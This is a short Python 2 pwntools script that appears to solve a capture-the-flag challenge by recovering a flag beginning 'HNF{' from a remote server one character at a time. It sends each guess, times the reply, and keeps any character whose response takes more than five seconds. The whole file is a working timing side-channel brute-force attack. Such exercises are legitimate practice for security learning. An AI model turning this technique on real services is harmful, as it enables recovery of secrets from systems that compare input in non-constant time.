#!/usr/bin/env python2

from pwn import remote
import time
import string

charset = string.ascii_lowercase + string.ascii_uppercase + string.punctuation + string.digits

flag = "HNF{"
while flag[-1] != "}":
    for c in charset:
        print "\nTesting {} now\n".format(c)
        r = remote("ctf.yadunut.com", 8003)
        r.recv()

        # get 1st time
        before = time.time()
        r.sendline(flag + c)
        r.recv()
        # 2nd time for comparison
        after = time.time()
        difference = after-before
        r.close()

        if difference > 5:
            flag+=c
            print "CHAR FOUND!!"
            print "Current Flag: {}".format(flag)
            break
        

print "FOUND FLAG!!\nFlag: {}".format(flag)
